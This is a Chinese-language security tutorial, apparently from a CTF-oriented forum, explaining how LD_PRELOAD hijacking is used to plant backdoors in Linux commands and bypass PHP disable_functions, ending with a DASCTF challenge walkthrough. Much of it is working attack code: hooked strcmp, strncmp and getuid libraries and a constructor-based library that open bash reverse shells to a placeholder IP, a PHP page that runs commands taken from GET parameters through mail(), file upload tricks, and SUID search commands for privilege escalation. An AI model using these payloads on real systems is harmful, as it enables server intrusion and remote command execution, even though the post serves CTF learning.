0x00 前言
=======

最近的比赛中 LD\_PRELOAD 经常出现（虎符的ezphp，DAS的upgstore），结合对环境变量的操纵和一些文件上传与文件包含等漏洞的 tricks，让我们的 PHP 赛题变得非常复杂与神奇了起来。

0x01 前置知识
=========

LD\_PRELOAD 简介
--------------

> `LD_PRELOAD`是`Linux/Unix`系统的一个环境变量，它影响程序的运行时的链接（Runtime linker），它允许在程序运行前定义优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。

通过上述对 LD\_PRELOAD 的功能的描述，我们可以想到，既然能够覆盖正常的函数库，那么我们是不是就可以利用这里的功能来向程序中注入我们想要实现的代码或者说程序，来实现我们的目的呢？

这也就是我们的 LD\_PRELOAD 在攻防中的功能。

程序的链接
-----

程序的链接可以分为以下三种

- 静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。
- 装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。
- 运行时动态链接：原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。

静态链接库，在Linux下文件名后缀为`.a`，如`libstdc++.a`。在编译链接时直接将目标代码加入可执行程序。

动态链接库，在Linux下是`.so`文件，在编译链接时只需要记录需要链接的号，运行程序时才会进行真正的“链接”，所以称为“动态链接”。如果同一台机器上有多个服务使用同一个动态链接库，则只需要加载一份到内存中共享。因此， **动态链接库也称共享库** 或者共享对象。

Linux规定动态链接库的**文件名规则**比如如下：

`libname.so.x.y.z`

- `lib`：统一前缀。
- `so`：统一后缀。
- `name`：库名，如libstdc++.so.6.0.21的name就是stdc++。
- `x`： **主版本号** 。表示库有重大升级，不同主版本号的库之间是**不兼容**的。如libstdc++.so.6.0.21的主版本号是6。
- `y`： **次版本号** 。表示库的增量升级，如增加一些新的接口。在主版本号相同的情况下， **高的次版本号向后兼容低的次版本号** 。如libstdc++.so.6.0.21的次版本号是0。
- `z`： **发布版本号** 。表示库的优化、bugfix等。相同的主次版本号，不同的发布版本号的库之间 **完全兼容** 。如libstdc++.so.6.0.21的发布版本号是21。

动态链接库的 **搜索路径搜索的先后顺序**

- 编译目标代码时指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；
- 环境变量`LD_LIBRARY_PATH`指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；
- 配置文件`/etc/ld.so.conf`中指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；
- 默认的动态库搜索路径`/lib`；
- 默认的动态库搜索路径`/usr/lib`；

不过可以发现，这里我们要利用的环境变量 LD\_PRELOAD 并没有出现在这里的搜索路径之中，反而出现了一个 LD\_LIBRARY\_PATH，这里关于二者之间的关系和区别在 [stackoverflow](https://stackoverflow.com/questions/14715175/what-is-the-difference-between-ld-preload-path-and-ld-library-path) 上也有大佬讨论，观点也很多，不过在这里我比较认可的是下面这个观点

> `LD_PRELOAD`(not `LD_PRELOAD_PATH`) 是要在任何其他库之前加载的特定库 ( *files* ) 的列表，无论程序是否需要。`LD_LIBRARY_PATH`是在加载无论如何都会加载的库时要搜索的 *目录列表。* 在 linux 上，您可以阅读`man ld.so`有关这些和其他影响动态链接器的环境变量的更多信息。

可见，这里 LD\_PRELOAD 甚至超脱于动态链接库的搜索路径先后顺序之外，它可以指定在程序运行前优先加载的动态链接库

0x02 利用
=======

在我的理解中，LD\_PRELOAD 实际上也是一种代码注入，知识注入的方式和普遍的 Web 端注入的方式不同。

demo
----

我们重写程序运行过程中所调用的函数并将其编译为动态链接库文件，然后通过我们对环境变量的控制来让程序优先加载这里的恶意的动态链接库，进而实现我们在动态链接库中所写的恶意函数。

具体的操作步骤如下：

1. 定义一个函数，函数的名称、变量及变量类型、返回值及返回值类型都要与要替换的函数完全一致。这就要求我们在写动态链接库之前要先去翻看一下对应手册等。
2. 将所写的 c 文件编译为动态链接库。
3. 对 LD\_PRELOAD 及逆行设置，值为库文件路径，接下来就可以实现对目标函数原功能的劫持了
4. 结束攻击，使用命令 unset LD\_PRELOAD 即可

这个攻击方式可以用在任意语言之中，我们这里用一个 C 语言的 demo 来进行一下测试。

**whoami.c**

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
    char name[] = "mon";
    if (argc < 2) {
        printf("usage: %s <given-name>\n", argv[0]);
        return 0;
    }
    if (!strcmp(name, argv[1])) {
        printf("\033[0;32;32mYour name Correct!\n\033[m");
        return 1;
    } else {
        printf("\033[0;32;31mYour name Wrong!\n\033[m");
        return 0;
    }
}

```

我们接下来写一个动态链接库，目标函数为这里进行判断的 strcmp 函数

```c
#include <stdlib.h>
#include <string.h>
int strcmp(const char *s1, const char *s2) {
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    return 0;
}
```

由于我们通过 LD\_PRELOAD 劫持了函数，劫持后启动了一个新进程，若不在新进程启动前取消 LD\_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD\_PRELOAD，最直接的就是调用 `unsetenv("LD_PRELOAD")`。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-502d84a23b88a9ab74710e883d99ffbb5890cf50.png)

成功后输入什么都会提示正确

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-4f03f7edd11136c742e5df21b4eab944481c918b.png)

此时我们已经劫持了 strcmp 函数

制作后门
----

### 系统命令后门

在操作系统中，命令行下的命令实际上是由一系列动态链接库驱动的，在 linux 中我们可以使用`readelf -Ws`命令来查看，同时系统命令存储的路径为`/uer/bin`

既然都是使用动态链接库，那么假如我们使用 LD\_PRELOAD 替换掉系统命令会调用的动态链接库，那么我们是不是就可以利用系统命令调用动态链接库来实现我们写在 LD\_PRELOAD 中的恶意动态链接库中恶意代码的执行了呢？

这也就是我们制作后门的原理，这里以 ls 为例作示范

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-88a3e42fff22d3a1f0315986e133c788357ae665.png)

我们来挑选一个操作起来比较方便的链接库，选择到 `strncmp@GLIBC_2.2.5`

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-00381afd014215059aeb5e22c95aa0e21bfd96cb.png)

这样我们的 ls 同时通过调用 system 调用了 id 命令

hook\_strncmp.c

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload() {
    system("id");
}

int strncmp(const char *__s1, const char *__s2, size_t __n) {    // 这里函数的定义可以根据报错信息进行确定
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    payload();
}
```

既然已经调用了 id，那么我们完全可以再利用这里的执行命令来反弹一个 shell

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload() {
    system("bash -c 'bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1'");
}

int strncmp(const char *__s1, const char *__s2, size_t __n) {    // 这里函数的定义可以根据报错信息进行确定
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    payload();
}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-345cdd977bc803a5205d16171fc137205827107e.png)

成功反弹 shell

引申至 PHP
-------

既然我们已经劫持了系统命令，那么我们是不是就有办法在 web 环境中实现基于 LD\_PRELOAD 的 RCE 呢？

但是这里实际上是要仔细思考一下的。我们需要一个 **新的进程** 的启动，加之环境变量的操纵与文件上传和文件包含，，有时候，我们已经拿到了 shell ，但是因为disable\_functions不能执行命令，不能拿到想要的东西，而我们利用 LD\_PRELOAD 劫持进程之后的反弹 shell ，就可以执行任意命令了，这也就是我们常说的 **绕过 disable\_function**。

不过这里我们可以注意到一个点很关键，我们需要启动一个新的进程，并利用 LD\_PRELOAD 劫持这个进程相关的链接库。

在 PHP 中，我们需要找到可以启动新进程的 PHP 函数，这种情形通常会出现在 处理图片、请求网页、发送邮件等场景中，通常情况下我们所使用的便是 mail 函数了。

### 利用 mail 函数启动新进程

我们可以先来看一下 mail 函数会调用什么动态链接库。

首先写一个 mail.php

```php
<?php
mail("a@localhost","","","","");
?>
```

执行以下命令查看进程调用的系统函数明细

```php
strace -f php mail.php 2>&1 | grep -A2 -B2 execve
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-a4c23313880fa6e3895f3470dc0a08b4c74f70fc.png)

可以看到 execve 所执行的动态链接库为 sendmail，不过这里我装的虚拟机里竟然没有这个文件

```bash
sudo apt-get install sendmail
```

强行展示

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-5e0e163abce82efc179495e4f4f97a8b67db9bed.png)

```bash
readelf -Ws /usr/sbin/sendmail
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-83b443ba5f731ac11e0463252a222522e0f2f14a.png)

最终选择到的是第 82 行的 getuid

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-1e31ab817f18fa871a0e5c1c6a7bfcd52035db8c.png)

hook\_getuid.c

```bash
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload() {
    system("bash -c 'bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1'");
}

uid_t getuid() {
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    payload();
}
```

编译后我们可以利用 putenv 函数来实现链接库的设置

```php
<?php
putenv('LD_PRELOAD=/var/www/html/hook_getuid.so');    // 注意这里的目录要有访问权限
mail("a@localhost","","","","");
?>
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-9c2e5e9ee11e3c7a26d2fd130adc727ed34e6a37.png)

运行文件即可反弹 shell

### 利用 error\_log 函数启动新进程

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-6b7e6611ad3313abca157e6b00098843e90d3bd3.png)

error\_log 也存在发送信息的行为，我们可以看到这里也是向邮箱中发送信息，决定发送方式的是倒数第三个参数，为 1 时为邮箱，当然也有可以不存在的参数。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-bc0985cc4eb23443a4e52d87d9bc99a843dd6204.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-ca0986a0d6c2c902c668c16bd510f716cabef17f.png)

那么同理可得，这里也会调用 sendmail，`strace -f php error.php 2>&1 | grep -A2 -B2 execve` 看一下

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-40acbc27e4302e202644e237598e067a891c205d.png)

那么同样使用 putenv 测试一下

```php
<?php
putenv('LD_PRELOAD=/var/www/html/hook_getuid.so');
error_log("",1"","");
?>
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-a95964642f7679dd4e401e5a34bc9e4747694cc8.png)

### 劫持系统新进程

我们可以发现，上面的情况实际上导致了我们的攻击面是非常窄小的，我们在实际情况中很容易就会出现并没有安装 sendmail 的情况，就和我一开始进行测试的时候一样 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件等。那么有没有什么其他的方法呢？

`https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD`

> 设想这样一种思路：利用漏洞控制 web 启动新进程 a.bin（即便进程名无法让我随意指定），a.bin 内部调用系统函数 b()，b() 位于系统共享对象 c.so 中，所以系统为该进程加载共 c.so，我想法在 c.so 前优先加载可控的 c\_evil.so，c\_evil.so 内含与 b() 同名的恶意函数，由于 c\_evil.so 优先级较高，所以，a.bin 将调用到 c\_evil.so 内 b() 而非系统的 c.so 内 b()，同时，c\_evil.so 可控，达到执行恶意代码的目的。基于这一思路，将突破 disable\_functions 限制执行操作系统命令这一目标，大致分解成几步在本地推演：查看进程调用系统函数明细、操作系统环境下劫持系统函数注入代码、找寻内部启动新进程的 PHP 函数、PHP 环境下劫持系统函数注入代码。

系统通过 LD\_PRELOAD 预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那么就完全可以不依赖 sendmail 了。

这里场景让人不禁联想到构造方法，师傅们最后找到了在 GCC 中有一个 C 语言的扩展修饰符 `__attribute__((constructor))` ，这个修饰符可以让由它修饰的函数在 main() 之前执行，如果它出现在我们的动态链接库中，那么我们的动态链接库文件一旦被系统加载就将立即执行`__attribute__((constructor))` 所修饰的函数。

这样就将我们的格局打开了，我们要做的是劫持动态链接库这个共享对象本身，而不是单独局限于劫持某几个函数。

以劫持 ls 为例，我们之前所做的就是找到 ls 命令所调用的某一个动态链接库，然后对其进行劫持。但是我们在这里完全可以使用`__attribute__((constructor))` 自动加载之后来直接对 ls 命令进行劫持

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void preload (void){
    unsetenv("LD_PRELOAD");
    system("id");
}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-504d78e1f22f972616809826cbcd5a80c85ba2ef.png)

成功劫持，只要启动了进程便会进行劫持

- - - - - -

这里是上面链接提供的动态链接库的源文件

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

extern char** environ;

__attribute__ ((__constructor__)) void preload (void)
{
    // get command line options and arg
    const char* cmdline = getenv("EVIL_CMDLINE");

    // unset environment variable LD_PRELOAD.
    // unsetenv("LD_PRELOAD") no effect on some 
    // distribution (e.g., centos), I need crafty trick.
    int i;
    for (i = 0; environ[i]; ++i) {
            if (strstr(environ[i], "LD_PRELOAD")) {
                    environ[i][0] = '\0';
            }
    }

    // executive command
    system(cmdline);
}
```

以及 php 文件

```php
<?php
    echo "<p> <b>example</b>: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so </p>";

    $cmd = $_GET["cmd"];
    $out_path = $_GET["outpath"];
    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
    echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";

    putenv("EVIL_CMDLINE=" . $evil_cmdline);

    $so_path = $_GET["sopath"];
    putenv("LD_PRELOAD=" . $so_path);

    mail("", "", "", "");

    echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 

    unlink($out_path);
?>
© 2022 GitHub, Inc.
```

从环境变量 EVIL\_CMDLINE 中接收 bypass\_disablefunc.php 传递过来的待执行的命令行。

编译的时候要注意环境的版本，如果是 x86 版本的话要记得加上 -m32

绕过
--

### 后缀名绕过

so文件的后缀名实际上可以为任意后缀，这样可以绕过一些文件上传的限制

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-149ece7302948b771697e4bdbc22347ec83af264.png)

0x03 大赛题目
=========

\[DASCTF三月赛\] upgdstore
-----------------------

可以传phpinfo

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-01c6e21f473d6b2b8c8ee73dcdf6fcc002d60403.png)

我们在getshell之后，就是bypass disable\_function，这里使用LD\_Preload来bypass，getshell的过程就不细说了，之前写过

```php
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload() {
    system("bash -c 'bash -i >& /dev/tcp/xxx.xx.xx.xxx/2333 0>&1'");
}

uid_t getuid() {
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    payload();
}
```

编译 `gcc -shared -fPIC hook_getuid.c -o hook_getuid.so`

用ftp或者file\_put\_contents或者SplFileObject上传

然后反弹shell

```php
putenv("LD_PRELOAD=/tmp/hack.so");
mail("a@localhost","","","","");
```

最后一步 suid 提权就可以了

```bash
find /bin -perm -u=s -type f 2>/dev/null
find /usr -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```